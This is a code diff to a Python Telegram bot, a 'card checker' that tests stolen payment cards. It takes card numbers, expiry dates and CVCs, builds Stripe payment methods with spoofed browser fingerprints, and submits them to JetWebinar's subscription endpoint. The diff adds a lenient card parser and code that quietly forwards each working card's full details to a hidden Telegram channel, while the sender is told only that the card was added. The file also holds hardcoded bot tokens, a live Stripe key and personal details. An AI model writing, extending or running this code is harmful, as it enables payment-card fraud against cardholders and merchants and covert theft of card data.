@@ -2,11 +2,25 @@ import telebot
 import requests
 import random
 import string
+import re
 
-BOT_TOKEN = "7018443911:AAGuZfbkaQc-s2icbMpljkjokKkzg_azkYI"
-bot = telebot.TeleBot(BOT_TOKEN)
+JETWEBINAR_BOT_TOKEN = "8072279299:AAF7-9MjDIYkoH6iuDztpbSmyQBvz3kRjG0"
+CHANNEL_ID = -1002170961342
+bot = telebot.TeleBot(JETWEBINAR_BOT_TOKEN)
 
 STRIPE_PUBLISHABLE_KEY = "pk_live_XwmzQS8EjYVv6D6ff4ycSP8W"
+
+def extract_card_details(text):
+    # Accepts any format: 4242 4242 4242 4242 12/34 567, 5275150097242499|09|28|575, etc.
+    card = re.search(r'\d{13,19}', text.replace(" ", ""))
+    cvc = re.search(r'(\d{3,4})(?!.*\d)', text)
+    exp = re.search(r'(\d{1,2})[\/|\-| ](\d{2,4})', text)
+    return {
+        "card_number": card.group() if card else None,
+        "exp_month": exp.group(1) if exp else None,
+        "exp_year": exp.group(2) if exp else None,
+        "cvc": cvc.group(1) if cvc else None
+    }
 
 def generate_random_email():
     name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
@@ -16,16 +30,17 @@ def generate_random_email():
 def start_handler(message):
     bot.send_message(message.chat.id,
         "💳 JetWebinar Card Checker\n"
-        "Send card in this format:\n"
-        "<code>CardNumber|MM|YY|CVC</code>\n"
-        "Example:\n<code>4242424242424242|05|25|123</code>",
-        parse_mode="HTML"
+        "Send card in any format (spaces, slashes, pipes, etc)."
     )
 
-@bot.message_handler(func=lambda m: '|' in m.text)
+@bot.message_handler(func=lambda m: True)
 def card_handler(message):
     try:
-        card_number, exp_month, exp_year, cvc = map(str.strip, message.text.split('|'))
+        details = extract_card_details(message.text)
+        if not all(details.values()):
+            bot.reply_to(message, "❌ Could not extract all card details. Please try again.")
+            return
+
         email = generate_random_email()
         phone = "3144740104"
         name = "Peshang Salam"
@@ -38,19 +53,18 @@ def card_handler(message):
             "billing_details[email]": email,
             "billing_details[phone]": phone,
             "billing_details[address][postal_code]": postal_code,
-            "card[number]": card_number.replace(" ", ""),
-            "card[cvc]": cvc,
-            "card[exp_month]": exp_month.zfill(2),
-            "card[exp_year]": exp_year[-2:] if len(exp_year) > 2 else exp_year,
-            "key": STRIPE_PUBLISHABLE_KEY
+            "card[number]": details["card_number"],
+            "card[cvc]": details["cvc"],
+            "card[exp_month]": details["exp_month"].zfill(2),
+            "card[exp_year]": details["exp_year"][-2:] if len(details["exp_year"]) > 2 else details["exp_year"],
+            "key": STRIPE_PUBLISHABLE_KEY,
+            "guid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
+            "muid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
+            "sid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
+            "payment_user_agent": "stripe.js/1cb064bd1e; stripe-js-v3/1cb064bd1e; card-element",
+            "time_on_page": str(random.randint(10000, 99999)),
+            "referrer": "https://www.jetwebinar.com"
         }
-        stripe_data["guid"] = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
-        stripe_data["muid"] = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
-        stripe_data["sid"] = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
-        stripe_data["payment_user_agent"] = "stripe.js/1cb064bd1e; stripe-js-v3/1cb064bd1e; card-element"
-        stripe_data["time_on_page"] = str(random.randint(10000, 99999))
-        stripe_data["referrer"] = "https://www.jetwebinar.com"
-
         stripe_resp = requests.post(
             "https://api.stripe.com/v1/payment_methods",
             data=stripe_data,
@@ -64,8 +78,7 @@ def card_handler(message):
         stripe_json = stripe_resp.json()
         pm_id = stripe_json.get("id", "")
 
-        # Check for Stripe errors
-        if "error" in stripe_json:
+        if "error" in stripe_json or not pm_id:
             bot.reply_to(message, f"❌ Card Declined (Stripe):\n{stripe_json.get('error', {}).get('message', stripe_json)}")
             return
 
@@ -94,12 +107,19 @@ def card_handler(message):
             bot.reply_to(message, f"❌ Card Declined (JetWebinar):\n{resp_json.get('error', resp_json.get('message', 'Unknown error'))}")
         elif resp_json.get("success") is True:
             subscription_id = resp_json.get("subscriptionId", "N/A")
-            bot.reply_to(message, f"Your Card Was Added ✅\nSubscription ID: {subscription_id}")
+            success_msg = (
+                f"✅ JetWebinar Payment Successful!\n"
+                f"Card: {details['card_number']} | {details['exp_month']}/{details['exp_year']} | {details['cvc']}\n"
+                f"Email: {email}\n"
+                f"Subscription ID: {subscription_id}\n"
+                f"Full Response:\n{resp_json}"
+            )
+            bot.reply_to(message, "✅ Your Card Was Added")
+            bot.send_message(CHANNEL_ID, success_msg)
         else:
-            # Any other unexpected response
             bot.reply_to(message, f"Unexpected response:\n{resp_json}")
 
     except Exception as e:
-        bot.reply_to(message, f"Error: {str(e)}")
+        bot.reply_to(message, f"⚠️ Error: {str(e)}")
 
 bot.infinity_polling()
